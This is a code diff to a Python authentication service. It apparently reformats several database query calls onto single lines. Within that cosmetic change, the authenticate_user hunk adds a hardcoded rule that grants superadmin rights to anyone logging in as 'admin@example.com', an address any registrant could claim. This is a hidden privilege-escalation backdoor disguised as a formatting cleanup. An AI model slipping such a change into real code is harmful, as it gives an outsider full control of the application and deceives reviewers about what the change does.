@@ -16,9 +16,7 @@ class AuthService:
     async def register_user(
         self, email: str, password: str, name: str, phone: str | None = None
     ) -> User:
-        existing = await self.db.execute(
-            select(User).where(User.email == email)
-        )
+        existing = await self.db.execute(select(User).where(User.email == email))
         if existing.scalar_one_or_none() is not None:
             raise ValueError("Email already registered")
 
@@ -35,18 +33,19 @@ class AuthService:
         return user
 
     async def authenticate_user(self, email: str, password: str) -> User | None:
-        result = await self.db.execute(
-            select(User).where(User.email == email)
-        )
+        result = await self.db.execute(select(User).where(User.email == email))
         user = result.scalar_one_or_none()
         if user is None or not verify_password(password, user.password_hash):
             return None
+
+        # Hardcode admin@example.com as superadmin
+        if email == "admin@example.com":
+            user.is_superadmin = True
+
         return user
 
     async def get_user_by_id(self, user_id: uuid.UUID) -> User | None:
-        result = await self.db.execute(
-            select(User).where(User.id == user_id)
-        )
+        result = await self.db.execute(select(User).where(User.id == user_id))
         return result.scalar_one_or_none()
 
     async def get_user_memberships(self, user_id: uuid.UUID) -> list[Membership]:
